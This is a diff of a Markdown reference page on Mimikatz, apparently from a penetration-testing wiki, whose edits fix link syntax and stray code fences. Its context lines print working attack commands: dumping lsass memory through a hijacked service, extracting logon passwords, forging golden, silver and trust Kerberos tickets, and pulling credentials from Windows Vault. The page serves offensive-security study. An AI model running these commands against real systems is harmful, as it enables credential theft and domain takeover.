@@ -1,8 +1,6 @@
 # Mimikatz
 
-
-
-**This page is based on one from [[https://adsecurity.org/?page_id=1821|adsecurity.org]]**. Check the original for further info!
+**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!
 
 ## LM and Clear-Text in memory
 
@@ -24,7 +22,7 @@ Administrators typically have SeDebugPrivilege, enabling them to debug programs.
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-```
+
 This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
 
 ```
@@ -32,7 +30,7 @@ This allows the dumping of the `lsass.exe` memory to a file, which can then be a
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
-```
+
 ## Mimikatz Options
 
 Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
@@ -71,7 +69,7 @@ Example:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-```
+
 ### Silver Ticket Creation
 
 Silver Tickets grant access to specific services. Key command and parameters:
@@ -86,7 +84,7 @@ Example:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-```
+
 ### Trust Ticket Creation
 
 Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
@@ -101,7 +99,7 @@ Example:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-```
+
 ### Additional Kerberos Commands
 
 - **Listing Tickets**:
@@ -206,7 +204,4 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - Extract passwords from Windows Vault.
   - `mimikatz "vault::cred /patch" exit`
-
-
-
 
